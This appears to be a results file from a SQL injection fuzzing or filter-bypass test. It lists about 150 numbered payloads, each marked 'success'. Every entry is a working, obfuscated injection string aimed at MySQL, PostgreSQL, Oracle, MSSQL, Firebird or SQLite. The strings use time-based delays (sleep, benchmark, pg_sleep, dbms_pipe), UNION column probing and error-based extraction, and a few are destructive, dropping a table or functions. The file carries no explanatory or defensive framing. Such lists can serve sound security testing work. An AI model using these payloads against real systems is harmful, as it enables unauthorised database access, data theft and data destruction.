719 success '1%")))\n||/**/8514 like benchmark(0x4c4b40,md5(0x544d5a4c))#/**/%`'
720 success '1)))/**/union/**/all/**/select null,null,null,null,null,null,null,null,null-- r'
721 success '1")) as ljhz/*!Fw*/WHere\x0c2416\x0bliKe/**/2416 aND \'@zK\'!=\'@zK^\' &&/**/1 && True;begin dbms_lock.sleep(5); EnD-- '
723 success '1" or\x0belt(\',\'!=\',"\',sleep(0x5)) '
727 success "0x1');sElEcT/**/count(*)/**/FRoM\tdomain.domains/**/AS\nt1,domain.columns/*]*/as t2,domain.tables/**/as t3/**/"
729 success "0x1'+(seLect lang\x0bwHere 0x105f LIkE/**/4191/**/union\nall SelecT null,null# I:"
730 success '1%";(select\x0b*\nfRoM/*h*/(selECT(sleep(0x5)))acdk)#\nEk.'
734 success "1')) OR 2367 like (SELecT count(*) From rdb$fields as t1,rdb$types As t2,rdb$collations/*@P*/as t3,rdb$functions as t4)-- %\t"
735 success '1)) as cbdx/**/where 9724!=9725 && True and elt(4249 like 4249 OR 9053<>9053\tAND True,7259)-- '
736 success '1"))\x0bor\x0celt(\'d\'<>\'d|\',sleep(5))/**/and/*kgq*/(("tvla"="tvla '
741 success '-(SELect 1499)) As gxfm WhErE 0x2622=(sELECt 9762)\x0bOr 5989=0x12ae-- Z,'
742 success "1) AND make_set('%Z:'='%Z:',8899) "
743 success "0x1' in boolean mode) Or 7552=(SELEcT count(*) fROm rdb$fields AS/**/t1,rdb$types AS/**/t2,rdb$collations aS/**/t3,rdb$functions as\x0ct4)# i"
750 success '-9119") WhERE \'RcC \'=\'RcC \'/**/Or\n8571=8571 OR \'G-f\'<>\'G-f\'-- \tu'
752 success '1\')));begin/**/user_lock.sleep(0x5); eNd--\n"'
753 success '-(seLeCT 0x16a8)") or 6872=0x1ad8 and ("tcab" like "tcab\x0b'
755 success "-5432') as dndq where 9042<>9043 order by 1# aj"
757 success "1')\x0bwHErE 3232 liKe\x0b3232;iif(3548 Like 8646,1,0x1/0)/**/"
760 success "1') oR 8514=benchmark(5000000,md5(0x544d5a4c))# "
763 success '1)\nAS iiku wHerE\n9466 lIKE 9466;selecT (CaSe/**/wHEN (5847=2826) tHen 5847 eLsE cast(1 aS int)/(SELECt 0x0 froM dual) eNd) fROm dual-- '
767 success "1'))) and 0x6cf=6793\x0cand\x0c((('rgcv'='rgcv "
769 success '1))/**/AnD 6537=dbms_pipe.receive_message(chr(76) oR chr(116)||chr(117) OR chr(65),5) anD ((6010=6010 '
776 success '1))) or 2633=dbms_pipe.receive_message(chr(112) OR chr(65)||chr(65)||chr(103),5) AnD (((6312 lIkE 0x18a8 '
787 success "1%');seLecT cAsE wHEn 0x1e25=7717 THen 1 elsE\x0bnull eND--/**/"
789 success '(sELecT 1)");iif(5257 like 5257 aNd 3171 NOT LIKE 3172 or False,0x1,(SeLEct 1)/(sElEcT 0)) '
792 success "-6586')) or/*Qn<z*/2021 likE 2996 "
798 success "1 WherE '\t#'='\t#' ANd (selecT 8312)=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)-- "
799 success '0x1") || (sELEct 8514)=benchmark(5000000,md5(0x544d5a4c))# '
800 success "0x1) || (SElECt 8466)=benchmark(5000000,md5(0x694a4745)) aND ('g' NOT LIKE 'g7' AND True "
801 success '1))) union all sELecT null,null,null,null,null,null,null,null#\x0b'
812 success "-8023' oR 6872 like 6872 "
820 success '0x1"/**/and/**/3202=like(\'abcdefg\',upper(hex(randomblob(0x1dcd6500/2))))\n'
823 success '1) WhERE 0x1d01 LIKE 7425 union all selecT\x0bnull,null,null,null,null,null,null,null,null,null-- '
824 success '0x1%")) aNd (sEleCt 7358)=6986--/**/'
830 success "1))\tAS uadn WhErE 3243 Like 3243 and True/**/aNd ']|'=']|' rlike sleep(5)#/*NW*/]5J"
831 success "0x1%')))\tor 8514=benchmark(5000000,md5(0x544d5a4c))# "
832 success "0x1')));seLeCt/**/pg_sleep(0x5)--\t"
833 success '1")/**/and 6565=2647 and ("mrge"\x0blike "mrge '
837 success "-5026' wHere 0x1c9c=7324 union/**/all SEleCT (sElecT 7324),7324--\x0c"
839 success "1' IN boolean mode) union all Select null,null,null,null,null,null,null,null# "
840 success '1%";sELEcT count(*)\nfRoM domain.domains as t1,domain.columns\nAs t2,domain.tables as t3-- F3'
841 success "-4331) as inpx WhErE\t';Un'=';Un' union/**/all SeLEcT 0x264c# "
845 success "1%'));seLecT pg_sleep(0x5)--/**/]"
846 success '0x1)) as goar/**/WhERE 0x965=2405\x0baND 5927=9731-- [s'
847 success "0x1'||(select/*Iv_#t*/'cfff'/*\\I*/where 'G'<>'GA';select\tdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),0x5) from dual)||' 9bM*"
850 success "1')));iif('ZC'='ZC',1,1/0) "
851 success '1") where \'6\x0b}\'=\'6\x0b}\' OR False and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)-- '
853 success '1";begin\ndbms_lock.sleep(0x5); end and "xouo" like\x0c"xouo '
854 success "1)) as qgok WhErE 'N]v'='N]v' OR False\nOr False/**/AND 3824 LikE benchmark(5000000,md5(0x76555642))-- "
855 success "1 WHErE 0x1350=4944 union\tall seleCt null,null,null,null,null,null,null,null,null# '"
856 success "0x1' iN boolean mode);SeLEcT (cAsE WhEn (4306=2815) thEN 4306\x0bElse\t1/(selECT 0) End)-- |k"
864 success "1' IN boolean mode) union\nall/**/SeleCt null,null,null,null,null,null,null,null-- "
865 success '(seLECt 0x1)")) or\t(Select\x0c* FrOm/*N*/(seLeCt(sleep(0x5)))sddo)# =F'
868 success "-8015) WHERE 9808 Like 9808 oR 'U/'<>'U/' Or/**/9323=0x246b# "
870 success '0x1)) &&/*jR*/0xdfc=(SeLect count(*) fROm/*`*/domain.domains as t1,domain.columns AS t2,domain.tables AS t3)--/**/'
871 success '1%")) or/**/8466=benchmark(0x4c4b40,md5(0x694a4745))\nand (("%"="/**/'
874 success "0x1'+(sELecT wpbj wHERe 3223 LiKE 3223 oR 1284 NOT iN (1283,0x504,1285);seleCt (cASe wHEN (9992 Like 9992) tHeN 1\nelSe 4666*(SElecT 4666 FroM master..sysdatabases) EnD)-- =)pOE"
879 success '1/**/WHere\x0b8390=8390/**/aND/**/3824=benchmark(5000000,md5(0x76555642))--/**/'
880 success "0x1'+(select/*w@v*/taga where 'kf'!='kf&';sElECt count(*)/**/fROM\x0brdb$fields As t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions as t4--\t"
884 success "1' In boolean/**/mode) && 0xb25=cast((chr(0x71)||chr(113)||chr(112)||chr(106)||chr(113))||(seLeCt (caSE whEN (5338 in (5337,5338,5339)) thEN\n1 else 0 enD))::text Or (chr(113)||chr(122)||chr(0x76)||chr(122)||chr(113)) AS numeric)# ]"
885 success '1;sELecT pg_sleep(0x5)--\t'
886 success "1')) aS tgso WheRe (seLECT 1349)=1349 union\tall sELECt null,null,null,null-- "
887 success "0x1'\t&& sleep((seleCt 5)) "
889 success "(sElECt 1)' In boolean mode);begin user_lock.sleep(0x5);\x0bEnd# "
890 success '1) WhEre 2684 LIKE 2684;SEleCt (CaSe wHEn (4769 like 0x12a1)/**9(/*/theN 4769 eLSe 4769*(sELEct 0x12a1 fROm mysql.db) End)# '
892 success '1") WhErE 0x1d9a=7578 aNd 0x190e=(SELect count(*) fROm rdb$fields aS t1,rdb$types As t2,rdb$collations As t3,rdb$functions AS\tt4)-- '
893 success "0x1'\tin boolean/**/mode) and elt('({$'='({$',sleep(0x5))# "
895 success '0x1%"));select case when 5308 like 6745 then 0x1 else null end-- W'
896 success '0x1")))/**/and sleep(0x5)\x0cand\x0b((("bvgg"="bvgg '
897 success "1')\trlike (select\x0c(case when ('*'='*' OR 9718!=0x25f6 OR False) then 1 else 0x28 end))/**/and ('mizk'='mizk/*<?!sJ*/"
898 success "0x1'))\nand\n8148=like('abcdefg',upper(hex(randomblob(0x1dcd6500/2))))--/**/$"
899 success "1'+(select\n'uijv' where/**/400 IN (399,400,401)/**/and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)-- "
902 success '-(sELECt 3364)%")))/**/union/**/all SeleCt 0x1558-- jx'
907 success '1%")/**/union all\x0bsElEct null,null,null-- '
915 success '-5148")) or 5310=8229\n'
917 success "0x1'/*A06*/WherE 5776 iN (5775,(SElect 5776),5777) union\nall Select null,null,null--  "
918 success "1'))) union/**/all/**/select\nnull,null,null,null,null,null,null,null# "
922 success "(SeLeCt 1)' WHeRe 0xaf2<>2803 oR 6364=0x18dd order by/**/1# X[X"
930 success '1") aS cnrh whEre \'\nr<\'<>\'\tr<<\' && \'Tf5\' NOT LIKE \'Tf5y\' And 3824=benchmark(5000000,md5(0x76555642))-- vK'
932 success "1') aS fxid wheRE 'O'='O';iF(0x1edb=7899) seLeCT 7899 else DRop function zbbp-- K"
937 success '0x1" rlike (selecT/**/(case wHeN ((selECT 7689) lIke 7689)\nThen 0x1 Else/**|e*/0x28 eND)) '
946 success "1') As/**/bihs wHEre 4197\x0clike 4197 Or 0x0;sElect pg_sleep(5)-- "
949 success "1'));SELEct\t(cASe/**/wHEN (9667 LiKE (seLect 6212)) THEN 9667 eLse cast(1 aS int)/(sEleCt 0\x0cFrOm dual) end)\x0bFRoM dual-- "
958 success "1%') union all SElECt null,null,null,null,null,null,null,null,null,null--\t4K"
959 success "1)))/*r*/AND/*3_:u*/8148=LiKE('abcdefg',upper(hex(randomblob(0x1dcd6500/0x2))))--\x0b"
960 success '0x1 Or (sElEct * FRoM/**/(sElect(sleep(0x5)))ydpu) '
963 success "-5891) wHeRE\x0c')@C#' LIKE ')@C#' union/**/all\x0cSeLecT/*\n*/0x16a0,5792,(SELECT 0x16a0),5792,0x16a0# "
967 success '1)) AS mmby WHeRe 3990=0xf96 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)-- '
969 success '-6145 Or (8459 lIKE/**/8459)*4906--\x0byklv '
971 success 'dRoP table [dbo].[dimdate] '
975 success '1")))\x0cand 0x1535=9596 '
977 success '0x1 and make_set(9542=8888,0x22b8)-- idkn '
978 success '1")));iF(8727 LiKe 4039)/**/SeLECt/**/(SEleCt 0x2217) ELse/**/DroP\tfunction giql--/**/'
979 success '-(SELECT 3234)%")) or elt(3975!=0xf88,3623)\x0cand\x0c(("%"=" '
980 success '1";SElect/*$~*/pg_sleep(5) '
982 success "1%'/**/and make_set(5770 LIKE 5770 OR '6e'<>'6e',8899) and '%'=' "
986 success '1) aND 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(SElecT (CaSe WHeN (9005!=9006 anD/**/1 Or False ANd True)/*ua*/then\x0b1\tElSE\x0b0 End) fROM dual)||chr(113)||chr(122)||chr(118) OR chr(122)||chr(113))) '
992 success "1%')) union\tall SeLECt null,null,null,null,null,null,null,null-- C\t"
994 success "1 WhERe 'i>' LIke 'i>' Or False;seLECt count(*) From domain.domains AS t1,domain.columns as t2,domain.tables\x0cAs t3-- '<"
998 success '1")) aS ngvf WHerE \'pF\' like \'pF\' ANd True Or 7552=(sELEcT count(*) fROm rdb$fields as t1,rdb$types\nas t2,rdb$collations AS t3,rdb$functions\x0caS t4)-- '
999 success "(SElecT 1)' WhEre '_='='_=';begin dbms_lock.sleep((SElEcT 0x5));/*,@*/ENd-- "
1009 success "0x1)) As oywa WheRE 7951 likE 7951 aND '<)7 ' not like '<)7 )' OR 8777=8778\nor 'T' LIKE 'TK'\nunion all sElecT null,null,null,null,null,null#\x0b OcE"
1012 success '1") aS nyui/*{*/wHeRE 2511=2511;iif(5257 LIke 5257,1,1/0) '
1014 success "0x1' in boolean\nmode)/*/*/union all SElEcT null-- \r"
1021 success '-2122") As zytb WheRE \'-\'=\'-\' Or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(sElEct (CaSE wHEn (\'k\'<>\'k)\' anD\x0b\'ek,B%\' NOT LIKE \'ek,B%d\') tHeN 1 ElSE 0 eND) frOM dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- '
1022 success '0x1;begin\x0cuser_lock.sleep(0x5); end--\n'
1037 success "1'))) union all\x0bSelecT null,null,null,null,null--/**/"
1044 success "1) where '<Y'<>'<YU' OR 8005 NOT LIKE 8005 && 1/**/AND '];'<>'];^' && 'gL0=\x0b'!='gL0= .'--\n"
1046 success '-4317")) as nxvn wHERE/**/\'2\r%-.\'=\'2\r%-.\' OR False/**/union all/**/sELecT\t(sELeCT 2566),2566,2566# X<'
1047 success "-0x1976'))/**/As/**/vocx/**/WhERe 2539=0x9eb/**/or\x0c(8652=2025)*2025--/**/"
1051 success '1)) rlike/*`x\\Q*/(sELECt * FrOm (SeLect(sleep(0x5)))vwyq)# dl'
1053 success '0x1") As drrx WherE\t8633 like 8633 union/*!G:4*/all Select null,null,null-- '
1055 success "-(seLecT 2823)')) or 0x161f=4228\x0band/**/(('skgh'/*]p*/like 'skgh "
1058 success "1'\nwhere '''<>''h';select case when/**/4537=0x20e2 then 1\x0celse null end-- "
1062 success "-6412%' or 0xfe1=5815\tand/**/'%'=' "
1064 success '0x1") WherE (SeLEcT 9223)=9223 && exp(~(seLECt * FrOM (seLECt\nconcat(0x7171706a71,(sELecT/*yIMX*/(elt(\'JhF#\'<>\'JhF#O\',(sELEct (SelecT 1))))),0x717a767a71,0x78))x))-- >%$['
1065 success '1)) oR 8466=benchmark(0x4c4b40,md5(0x694a4745)) && ((8189 like 0x1ffd '
1068 success '0x1"))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (8827<>8828 OR False OR False) then 0x1 else 0 end)),0x717a767a71)),0x1) and ((("jywy"\x0blike "jywy '
1069 success '(seLEcT\x0c1))/**/union/**/all SELecT/**/null,null,null,null# \\'
1070 success '(sElECT 0x1) wHERe 543 in (542,543,544) rlike (SeleCt *\nfrOM/**/(SElEct(sleep(5)))vwyq)# '
1071 success "1'+(SElECT rwse wHeRE 9843 like 0x2673 union all\x0bsElECT null,null,null,null,null,null,null-- "
1072 success '1%"))) AnD\t2006/**/LIKE 2006/*cB8m\\*/'
1076 success "1'+(seLeCT\x0cvfmy wHErE\n5711=5711;iif(5214=7412,0x1,1/0) "
1077 success "-0xfa1')) or\n5634=4044--/**/"
1078 success "-8038'))\nor elt('Y'<>'Yp',3623) and (('xfyq'='xfyq "
1084 success '-0x17dd/**/union\x0call SeLEct 6784-- 6'
1086 success '0x1%");selECt (CAse wHEN (6179=8476) TheN 6179 else cast(1 as int)/(SEleCt 0x0 from dual) eND) frOM dual-- '
1090 success "-4032')/**/where\t'p:);'!='p:);)' Or 1809=2810# "
1091 success '1)) as eveb where 7567=7567 || False;if(0x14c4=4416) select 5316 else/**/drop function vtve-- '
